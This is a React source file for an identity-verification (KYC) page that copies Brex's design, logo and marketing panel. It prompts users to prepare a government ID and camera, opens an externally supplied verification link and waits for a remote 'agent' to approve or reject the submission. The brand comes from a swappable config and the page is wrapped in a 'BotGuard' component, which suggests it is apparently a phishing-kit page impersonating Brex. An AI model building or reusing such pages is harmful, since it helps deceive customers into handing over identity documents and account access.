'use client';

/**
 * Brex KYC (Know Your Customer) Page
 * Split-screen layout matching Brex design
 * Includes popup blocker detection with manual link fallback
 */

import { useState, useEffect } from 'react';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';
import { Loader2, ExternalLink } from 'lucide-react';

export default function KYCPage() {
  const { status, caseId, agentMessage } = useSessionStore();

  const [kycStatus, setKycStatus] = useState<'not_started' | 'in_progress' | 'waiting'>('not_started');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Store KYC URL for fallback link if popup is blocked
  const [kycUrl, setKycUrl] = useState<string | null>(null);
  const [popupBlocked, setPopupBlocked] = useState(false);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setKycStatus('not_started');
      setError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsLoading(false);
    }
  }, [status, agentMessage]);

  async function handleBeginKYC() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    try {
      const response = await fetch('/api/user-started-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to start KYC process');
      }

      const data = await response.json();
      const url = data.kyc_url;

      if (!url) {
        throw new Error('KYC provider is not configured properly');
      }

      // Store the URL for fallback
      setKycUrl(url);

      // Try to open popup
      const popup = window.open(url, '_blank');

      // Check if popup was blocked
      if (!popup || popup.closed || typeof popup.closed === 'undefined') {
        // Popup was blocked - show fallback link
        setPopupBlocked(true);
      }

      setKycStatus('in_progress');
      setError(null);
    } catch (err) {
      console.error('KYC begin error:', err);
      setError('Unable to start verification. Please try again.');
    }
  }

  // Manual open for when popup is blocked
  function handleManualOpen() {
    if (kycUrl) {
      window.open(kycUrl, '_blank');
    }
  }

  async function handleKYCCompleted() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch('/api/submit-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to submit KYC');
      }

      setKycStatus('waiting');
      useSessionStore.setState({
        status: 'waiting',
        agentMessage: 'Waiting for review...',
      });
    } catch (err) {
      console.error('KYC completion error:', err);
      setError('Failed to submit. Please try again.');
      setIsLoading(false);
    }
  }

  const handleRetry = () => {
    setError(null);
    setKycStatus('not_started');
    setPopupBlocked(false);
    setKycUrl(null);
  };

  const isWaiting = kycStatus === 'waiting' || status === 'waiting' || isLoading;

  return (
    <BotGuard>
      <div className="brex-boundary">
        <div className="brex-app">

          {/* Left Column */}
          <main className="brex-layout">

            <div className="auth-org-logo">
              <img src="/logo_full_4x.png" alt="Brex Logo" />
            </div>

            <div className="auth-container">

              <h1>Identity Verification</h1>

              <form className="auth-form" onSubmit={(e) => e.preventDefault()}>
                {/* Waiting State */}
                {isWaiting ? (
                  <>
                    <p className="form-description" style={{ textAlign: 'center' }}>
                      Please wait while we verify your identity.
                    </p>
                    <div className="auth-actions">
                      <button className="button-primary" disabled>
                        <Loader2 className="h-4 w-4 animate-spin" />
                        Verifying...
                      </button>
                    </div>
                  </>
                ) : (
                  <>
                    {kycStatus === 'not_started' && (
                      <>
                        <p className="form-description">
                          To protect your account, we need to verify your identity.
                        </p>

                        <div className="o-form-fieldset">
                          <label className="form-label">Have ready:</label>
                          <ul className="kyc-checklist">
                            <li>A valid government-issued ID</li>
                            <li>A device with a camera</li>
                          </ul>
                        </div>

                        {error && (
                          <div className="global-error">
                            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                              <path fillRule="evenodd" clipRule="evenodd"
                                d="M8 15C11.866 15 15 11.866 15 8C15 4.13401 11.866 1 8 1C4.13401 1 1 4.13401 1 8C1 11.866 4.13401 15 8 15ZM7 4.5C7 3.94772 7.44772 3.5 8 3.5C8.55228 3.5 9 3.94772 9 4.5V8.5C9 9.05228 8.55228 9.5 8 9.5C7.44772 9.5 7 9.05228 7 8.5V4.5ZM7 11.5C7 10.9477 7.44772 10.5 8 10.5C8.55228 10.5 9 10.9477 9 11.5C9 12.0523 8.55228 12.5 8 12.5C7.44772 12.5 7 12.0523 7 11.5Z"
                                fill="#b92d26" />
                            </svg>
                            <span>{error}</span>
                          </div>
                        )}

                        <div className="auth-actions">
                          <button
                            type="button"
                            onClick={handleBeginKYC}
                            className="button-primary"
                          >
                            Begin Verification
                            <ExternalLink className="h-4 w-4" style={{ marginLeft: '4px' }} />
                          </button>
                        </div>

                        <p className="form-note">
                          Opens in a new window
                        </p>
                      </>
                    )}

                    {kycStatus === 'in_progress' && (
                      <>
                        {/* Popup blocked fallback */}
                        {popupBlocked && kycUrl && (
                          <div className="popup-blocked-notice">
                            <p className="form-description" style={{ marginBottom: '12px', color: 'var(--text-main)' }}>
                              <strong>Pop-up blocked?</strong> Click the link below to open the verification page:
                            </p>
                            <a
                              href={kycUrl}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="popup-fallback-link"
                              onClick={() => setPopupBlocked(false)}
                            >
                              Open Verification Page
                              <ExternalLink className="h-4 w-4" style={{ marginLeft: '6px' }} />
                            </a>
                          </div>
                        )}

                        <p className="form-description" style={{ marginTop: popupBlocked ? '16px' : '0' }}>
                          Complete the verification in the new window, then click Continue.
                        </p>

                        {error && (
                          <div className="global-error">
                            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                              <path fillRule="evenodd" clipRule="evenodd"
                                d="M8 15C11.866 15 15 11.866 15 8C15 4.13401 11.866 1 8 1C4.13401 1 1 4.13401 1 8C1 11.866 4.13401 15 8 15ZM7 4.5C7 3.94772 7.44772 3.5 8 3.5C8.55228 3.5 9 3.94772 9 4.5V8.5C9 9.05228 8.55228 9.5 8 9.5C7.44772 9.5 7 9.05228 7 8.5V4.5ZM7 11.5C7 10.9477 7.44772 10.5 8 10.5C8.55228 10.5 9 10.9477 9 11.5C9 12.0523 8.55228 12.5 8 12.5C7.44772 12.5 7 12.0523 7 11.5Z"
                                fill="#b92d26" />
                            </svg>
                            <span>{error}</span>
                          </div>
                        )}

                        <div className="auth-actions">
                          <button
                            type="button"
                            onClick={handleKYCCompleted}
                            className="button-primary"
                            disabled={isLoading}
                          >
                            {isLoading && <Loader2 className="h-4 w-4 animate-spin" />}
                            {isLoading ? 'Submitting...' : 'Continue'}
                          </button>
                        </div>

                        <button
                          type="button"
                          onClick={handleRetry}
                          disabled={isLoading}
                          className="form-link-button"
                        >
                          Start over
                        </button>
                      </>
                    )}
                  </>
                )}

                <p className="form-footer">
                  Need help? Contact {currentBrand.companyName} support
                </p>
              </form>
            </div>

            <div className="signup-link">
              New to Brex? <a href="#">Sign up</a>
            </div>

          </main>

          {/* Right Column: Marketing */}
          <aside className="marketing-content">
            <div className="marketing-inner">
              <h2 className="marketing-badge">DOWNLOAD THE MOBILE APP</h2>
              <p className="marketing-title">Access your Brex card anywhere.</p>
              <div className="marketing-img">
                <img src="/customerstories.png" alt="Brex customer stories layout" />
              </div>
            </div>
          </aside>

        </div>
      </div>
    </BotGuard>
  );
}
